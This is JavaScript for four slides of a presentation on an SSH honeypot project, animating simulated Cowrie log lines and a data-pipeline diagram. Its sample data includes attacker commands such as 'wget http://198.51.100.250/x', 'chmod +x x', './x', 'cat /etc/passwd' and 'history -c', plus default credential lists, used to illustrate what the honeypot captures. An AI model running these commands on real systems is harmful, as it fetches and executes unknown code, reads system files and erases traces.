/* Slides 07-10: problem, firewall vs honeypot, solution, architecture */
(function () {
  'use strict';
  const pick = (a) => a[(Math.random() * a.length) | 0];
  const rndInt = (a, b) => Math.floor(a + Math.random() * (b - a + 1));
  const hex = (n) => Array.from({ length: n }, () => '0123456789abcdef'[rndInt(0, 15)]).join('');
  const pad = (n, l = 2) => String(n).padStart(l, '0');
  const USERS = ['root', 'admin', 'ubuntu', 'pi', 'test', 'oracle', 'postgres', 'user', 'ubnt', 'guest'];
  const PWS = ['123456', 'password', 'admin', 'qwerty', 'letmein', 'toor', 'raspberry', '12345678', 'welcome', 'changeme', 'ubnt', '1234'];
  const IPS = ['203.0.113.10', '198.51.100.7', '192.0.2.88', '198.51.100.44', '203.0.113.25', '192.0.2.99', '198.51.100.45', '192.0.2.77'];
  const CMDS = ['uname -a', 'whoami', 'ls -la', 'cat /etc/passwd', 'wget http://198.51.100.250/x', 'chmod +x x', './x', 'history -c'];

  function logLine() {
    const e = pick(['cowrie.login.failed', 'cowrie.login.failed', 'cowrie.login.failed', 'cowrie.login.failed',
      'cowrie.session.connect', 'cowrie.command.input', 'cowrie.session.closed', 'cowrie.login.success']);
    const u = pick(USERS), p = pick(PWS);
    let j = '{"eventid":"' + e + '"';
    if (e.indexOf('login') > 0) j += ',"username":"' + u + '","password":"' + p + '","message":"login attempt [' + u + '/' + p + '] ' + (e.endsWith('failed') ? 'failed' : 'succeeded') + '"';
    if (e.endsWith('input')) j += ',"input":"' + pick(CMDS) + '","message":"CMD: ' + pick(CMDS) + '"';
    if (e.endsWith('closed')) j += ',"duration":' + (rndInt(2, 90) + Math.random()).toFixed(2);
    j += ',"src_ip":"' + pick(IPS) + '","session":"' + hex(12) + '","sensor":"honeypot","timestamp":"2026-11-13T' + pad(rndInt(0, 23)) + ':' + pad(rndInt(0, 59)) + ':' + pad(rndInt(0, 59)) + '.' + pad(rndInt(0, 999999), 6) + 'Z"}';
    return { j, cls: e.endsWith('failed') ? 'f' : (e.endsWith('connect') || e.endsWith('closed')) ? 'c' : '' };
  }
  const esc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;');

  /* ===================================================================== 07 problem */
  (function () {
    const T = Deck.timers();
    const wall = $('#logscroll'), n = $('#lw-n');
    let count = 12408;
    function build() {
      if (wall.children.length) return;
      let html = '';
      for (let i = 0; i < 90; i++) { const l = logLine(); html += '<div class="' + l.cls + '">' + esc(l.j) + '</div>'; }
      wall.innerHTML = html + html;
    }
    Deck.register('problem', {
      enter() { build(); count = 12408; n.textContent = count.toLocaleString('en-US'); T.every(() => { count += rndInt(1, 4); n.textContent = count.toLocaleString('en-US'); }, 450); },
      leave() { T.clear(); },
    });
  })();

  /* ===================================================================== 08 versus */
  (function () {
    const T = Deck.timers();
    const fw = $('#vs-fw'), hp = $('#vs-hp'), btn = $('#vs-go');
    function add(sel, cls, text) { const d = document.createElement('div'); d.innerHTML = '<span class="' + cls + '">' + esc(text) + '</span>'; $(sel).appendChild(d); }
    function reset() {
      T.clear(); fw.classList.remove('run', 'done'); hp.classList.remove('run', 'done');
      $('#fw-log').innerHTML = ''; $('#hp-log2').innerHTML = '';
    }
    function run() {
      reset(); void fw.offsetWidth;
      fw.classList.add('run'); hp.classList.add('run');
      T.after(() => { fw.classList.add('done'); add('#fw-log', 'b', 'DROP  203.0.113.10 → port 22'); }, 1050);
      const L = [['k', 'connect  203.0.113.10'], ['k', 'login    root / toor  ✓'], ['v', 'command  uname -a'], ['v', 'command  cat /etc/passwd'],
        ['v', 'command  wget http://…/x'], ['v', 'command  chmod +x x'], ['v', 'command  ./x']];
      L.forEach((l, i) => T.after(() => add('#hp-log2', l[0], l[1]), 1350 + i * 380));
      T.after(() => hp.classList.add('done'), 1350 + L.length * 380);
    }
    btn.addEventListener('click', run);
    Deck.register('versus', {
      enter() { reset(); },
      leave() { reset(); },
      step(n, jump) { if (n >= 1 && !jump) run(); if (n === 0) reset(); if (n >= 1 && jump && !fw.classList.contains('done')) run(); },
    });
  })();

  /* ==================================================================== 09 solution */
  (function () {
    const T = Deck.timers();
    const raw = $('#sol-raw');
    let html = '';
    for (let i = 0; i < 17; i++) { const l = logLine(); html += '<div class="' + l.cls + '">' + esc(l.j.slice(0, 74)) + '</div>'; }
    raw.innerHTML = html;
    const nums = $$('#sol-out .stat em');
    function count() {
      nums.forEach((el) => {
        const to = +el.dataset.to; let t0 = null;
        const tick = (t) => { if (t0 === null) t0 = t; const k = Math.min(1, (t - t0) / 1300); el.textContent = Math.round(to * (1 - Math.pow(1 - k, 3))); if (k < 1 && el._on) requestAnimationFrame(tick); };
        el._on = true; requestAnimationFrame(tick);
      });
    }
    Deck.register('solution', {
      leave() { T.clear(); nums.forEach((e) => { e._on = false; }); },
      step(n) {
        nums.forEach((e) => { e._on = false; });
        if (n >= 2) T.after(count, 500); else nums.forEach((e) => { e.textContent = '0'; });
      },
    });
  })();

  /* ================================================================ 10 architecture */
  (function () {
    const T = Deck.timers();
    const pipe = $('#pipe'), nodes = $$('#pipe .pn'), dot = $('#pdot');
    const cap = $('#pcap-t'), hH = $('#pd-h'), hP = $('#pd-p'), hF = $('#pd-f');
    const INFO = [
      { h: 'Attacker PC', p: 'The second machine of our lab. It runs ordinary tools (ssh, hydra) against the honeypot, exactly like a real attacker would.', f: 'machine B · same network as the server' },
      { h: 'Cowrie honeypot', p: 'The decoy SSH server on port 2222. It accepts some logins, shows a fake shell and writes every action to a JSON log.', f: 'open-source · not our code · output: cowrie.json' },
      { h: 'Collector', p: 'Reads only the NEW lines of the log, remembers where it stopped, survives log rotation. Passwords are masked and hashed here: the clear text is never stored.', f: 'folder: collector/' },
      { h: 'Database', p: 'SQLite with four tables: attacks, sessions, alerts and ip_geo. Every event has a unique id, so re-reading the log never creates duplicates.', f: 'folder: database/' },
      { h: 'Detection engine', p: '11 rules look at every IP’s events and raise alerts with a severity. Alerts are deduplicated and labelled "not proof of compromise".', f: 'folder: detection/' },
      { h: 'Geolocation', p: 'Turns an IP into a country and city, once, and caches it. Private LAN addresses are labelled "Private network" without any network call.', f: 'folder: geo/' },
      { h: 'API', p: 'A small Flask server: validated parameters, date and IP filters, CSV export protected against spreadsheet formula injection.', f: 'folder: backend/' },
      { h: 'Dashboard', p: 'What you see in the demo: cards, timeline, map, attackers, sessions, alerts. It works offline and under a strict security policy.', f: 'folder: dashboard/' },
    ];
    const CAP = [
      '$ ssh root@honeypot -p 2222        # password guess: 123456',
      '{"eventid":"cowrie.login.failed","username":"root","password":"123456","src_ip":"203.0.113.10",…}',
      'login_failed · 203.0.113.10 · root · password "1*****" · fingerprint 8d969eef6ecad3c2',
      'INSERT INTO attacks …   (event_id is UNIQUE → duplicates are ignored)',
      'ALERT brute_force · medium · 5 failed logins in 60 s from 203.0.113.10',
      '203.0.113.10  →  China · Beijing   (cached for next time)',
      'GET /api/summary  →  { "failed_logins": 124, "total_alerts": 46, … }',
      'dashboard: "Failed logins" card +1 · the bubble on the map grows',
    ];
    const center = (i) => { const n = nodes[i]; return { x: n.offsetLeft + n.offsetWidth / 2, y: n.offsetTop + n.offsetHeight / 2 }; };
    function select(i) {
      nodes.forEach((n, k) => n.classList.toggle('sel', k === i));
      hH.textContent = INFO[i].h; hP.textContent = INFO[i].p; hF.textContent = INFO[i].f;
    }
    function light(i) { nodes.forEach((n, k) => n.classList.toggle('lit', k === i)); }
    function reset() { T.clear(); dot.classList.remove('on'); nodes.forEach((n) => n.classList.remove('lit')); }
    function play() {
      reset();
      const p0 = center(0);
      dot.style.transition = 'none'; dot.style.left = p0.x + 'px'; dot.style.top = p0.y + 'px';
      void dot.offsetWidth; dot.style.transition = '';
      dot.classList.add('on');
      nodes.forEach((n) => n.classList.remove('sel'));
      for (let i = 0; i < 8; i++) {
        T.after(() => {
          const p = center(i); dot.style.left = p.x + 'px'; dot.style.top = p.y + 'px';
          T.after(() => { light(i); cap.textContent = CAP[i]; select(i); }, 620);
        }, i * 1900);
      }
      T.after(() => { dot.classList.remove('on'); }, 8 * 1900 + 800);
    }
    nodes.forEach((n, i) => n.addEventListener('click', () => { reset(); select(i); cap.textContent = 'Click any block to see what it does.'; }));
    $('#pplay').addEventListener('click', play);
    Deck.register('arch', {
      enter() { reset(); nodes.forEach((n) => n.classList.remove('sel')); hH.textContent = ' '; hP.textContent = 'Click a block, or follow one login attempt through the whole system.'; hF.textContent = ''; cap.textContent = 'Click any block to see what it does.'; },
      leave() { reset(); },
      step(n, jump) { if (n >= 1 && !jump) play(); },
    });
  })();
})();
